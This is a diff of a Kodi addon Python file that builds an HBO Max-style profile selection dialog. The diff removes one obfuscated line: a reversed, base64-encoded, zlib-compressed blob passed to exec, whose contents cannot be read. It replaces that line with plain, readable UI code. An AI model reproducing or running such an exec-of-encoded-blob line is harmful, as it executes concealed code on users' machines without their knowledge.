@@ -1,1 +1,260 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+# -*- coding: utf-8 -*-
+"""
+Dialog personalizado para seleção de perfis - ESTILO HBO MAX
+Versão 2.1 - CORREÇÃO: Botão Gerenciar Perfis
+"""
+
+import xbmcgui
+import xbmc
+import os
+
+
+class DialogSelectProfile(xbmcgui.WindowXMLDialog):
+    """
+    Dialog personalizado para seleção de perfis (estilo HBO Max)
+    """
+    
+    # IDs dos controles
+    LIST_PROFILES = 50
+    BTN_ADD_ADULT = 101
+    BTN_ADD_KID = 102
+    BTN_MANAGE = 103  # ← Constante explícita para clareza
+    
+    # Cores das bordas (atribuídas ciclicamente aos perfis)
+    BORDER_COLORS = [
+        "FFaa4de5",  # Roxo
+        "FF4d9ae5",  # Azul
+        "FFe54d9a",  # Rosa
+        "FF5de5aa",  # Verde
+        "FFe5aa4d",  # Laranja
+    ]
+    
+    def __init__(self, *args, **kwargs):
+        super(DialogSelectProfile, self).__init__()
+        self.profiles = kwargs.get('profiles', [])
+        self.addon_path = kwargs.get('addon_path', '')
+        self.selected_profile = None
+        
+        for i, p in enumerate(self.profiles):
+            pass
+    
+    def onInit(self):
+        """Inicialização do dialog"""
+        
+        # Preencher a lista com os perfis
+        self._populate_profiles()
+        
+        # Definir foco inicial
+        try:
+            self.setFocusId(self.LIST_PROFILES)
+        except Exception as e:
+            xbmc.log(f"[DialogSelectProfile] Erro ao definir foco: {e}", xbmc.LOGERROR)
+    
+    def _populate_profiles(self):
+        """Preenche a lista com os perfis disponíveis"""
+        try:
+            list_control = self.getControl(self.LIST_PROFILES)
+            list_control.reset()
+            
+            
+            # Adicionar perfis existentes
+            for idx, profile in enumerate(self.profiles):
+                item = xbmcgui.ListItem(profile['name'])
+                
+                # Definir avatar
+                avatar_path = self._get_avatar_path(profile)
+                item.setArt({'icon': avatar_path, 'thumb': avatar_path})
+                
+                # Info adicional
+                if profile.get('last_access'):
+                    last_access = profile['last_access'][:10]
+                    item.setLabel2(f"Último acesso: {last_access}")
+                
+                # Atribuir cor de borda única (ciclicamente)
+                color_index = idx % len(self.BORDER_COLORS)
+                item.setProperty('border_color', self.BORDER_COLORS[color_index])
+
+                # Marcar se perfil tem PIN
+                if profile.get('pin'):
+                    item.setProperty('has_pin', 'true')
+                    
+                # Marcar se é perfil Kids (para exibir cadeado)
+                if profile.get('is_kids'):
+                    item.setProperty('is_kids', 'true')
+                    
+                # ── Estatísticas reais via history_db ──────────────────────
+                try:
+                    from resources.lib.db.history_db import history_db
+                    from resources.lib.profile_stats import get_profile_stats
+
+                    pid   = profile.get('id')
+                    stats = get_profile_stats(pid) if pid else None
+
+                    if stats:
+                        fmt = stats['formatted']
+
+                        # Barra de progresso: baseada em minutos assistidos
+                        # Referência máxima = 3000 min (~50h) → 200px
+                        total_min   = stats['watch_time'].get('total_minutes', 0)
+                        progress_px = min(int((total_min / 3000) * 200), 200)
+                        if progress_px > 0:
+                            item.setProperty('watch_progress', str(progress_px))
+
+                        # Stats textuais para o item focado no XML
+                        item.setProperty('stat_time',      fmt['watch_time'])
+                        item.setProperty('stat_completed', fmt['completed'])
+                        item.setProperty('stat_streak',    fmt['streak'])
+                        item.setProperty('stat_genres',    fmt['top_genres'])
+
+                except Exception as _e:
+                    pass
+
+                # CRÍTICO: Armazenar ID do perfil e índice
+                item.setProperty('profile_id', profile['id'])
+                item.setProperty('profile_index', str(idx))
+                
+                list_control.addItem(item)
+            
+            
+        except Exception as e:
+            xbmc.log(f"[DialogSelectProfile] Erro ao popular lista: {e}", xbmc.LOGERROR)
+            import traceback
+            xbmc.log(traceback.format_exc(), xbmc.LOGERROR)
+    
+    def _get_avatar_path(self, profile):
+        """Retorna o caminho completo do avatar"""
+        avatar = profile.get('avatar', 'icons/default_avatar.png')
+        
+        # Se já é um caminho absoluto, usa direto
+        if os.path.isabs(avatar):
+            return avatar
+        
+        # Senão, constrói o caminho relativo
+        return os.path.join(
+            self.addon_path,
+            'resources', 'medias',
+            avatar
+        )
+    
+    def onClick(self, controlId):
+        """Chamado quando um controle é clicado"""
+        
+        if controlId == self.LIST_PROFILES:
+            self._handle_profile_selection()
+        
+        elif controlId == self.BTN_ADD_ADULT:
+            self.selected_profile = '__ADD_ADULT__'
+            self.close()
+        
+        elif controlId == self.BTN_ADD_KID:
+            self.selected_profile = '__ADD_KID__'
+            self.close()
+            
+        elif controlId == self.BTN_MANAGE:  # ID 103
+            self.selected_profile = '__MANAGE__'
+            self.close()
+        
+        else:
+            pass
+    
+    def _handle_profile_selection(self):
+        """Processa a seleção de um perfil existente"""
+        try:
+            list_control = self.getControl(self.LIST_PROFILES)
+            selected_position = list_control.getSelectedPosition()
+            
+            
+            # Pegar o item na posição selecionada
+            selected_item = list_control.getSelectedItem()
+            
+            if not selected_item:
+                xbmc.log("[DialogSelectProfile] ERRO: Item selecionado é None!", xbmc.LOGERROR)
+                return
+            
+            profile_id = selected_item.getProperty('profile_id')
+            profile_index = selected_item.getProperty('profile_index')
+            
+            
+            # Buscar o perfil pelo ID (mais seguro que por índice)
+            found = False
+            for profile in self.profiles:
+                if profile['id'] == profile_id:
+                    self.selected_profile = profile
+                    found = True
+                    break
+            
+            if not found:
+                pass
+            
+            self.close()
+            
+        except Exception as e:
+            xbmc.log(f"[DialogSelectProfile] ERRO no _handle_profile_selection: {e}", xbmc.LOGERROR)
+            import traceback
+            xbmc.log(traceback.format_exc(), xbmc.LOGERROR)
+    
+    def onAction(self, action):
+        """Chamado quando uma ação é executada"""
+        action_id = action.getId()
+        
+        # Log apenas para ações de navegação e seleção
+        if action_id in (7, 1, 2, 3, 4):  # Select, Up, Down, Left, Right
+            try:
+                list_control = self.getControl(self.LIST_PROFILES)
+                pos = list_control.getSelectedPosition()
+            except:
+                pass
+        
+        # Fechar o dialog com ESC ou Back
+        if action_id in (9, 10, 92, 216, 247, 257, 275, 61467, 61448):
+            self.selected_profile = None
+            self.close()
+    
+    def get_selected_profile(self):
+        """Retorna o perfil selecionado"""
+        if self.selected_profile:
+            # Verificar se é uma ação especial (string)
+            if isinstance(self.selected_profile, str):
+                if self.selected_profile == '__ADD_ADULT__':
+                    pass
+                elif self.selected_profile == '__ADD_KID__':
+                    pass
+                elif self.selected_profile == '__MANAGE__':
+                    pass
+                else:
+                    pass
+            # É um dict (perfil real)
+            else:
+                pass
+        else:
+            pass
+        
+        return self.selected_profile
+
+
+# === HELPER FUNCTIONS ===
+
+def show_profile_selector(addon_path, profiles):
+    """
+    Exibe o dialog de seleção de perfis
+    
+    Args:
+        addon_path: Caminho do addon
+        profiles: Lista de perfis
+    
+    Returns:
+        Perfil selecionado, '__ADD_ADULT__', '__ADD_KID__', '__MANAGE__' ou None
+    """
+    dialog = DialogSelectProfile(
+        'SelectProfile.xml',
+        addon_path,
+        profiles=profiles,
+        addon_path=addon_path
+    )
+    
+    dialog.doModal()
+    selected = dialog.get_selected_profile()
+    
+    del dialog
+    
+    return selected
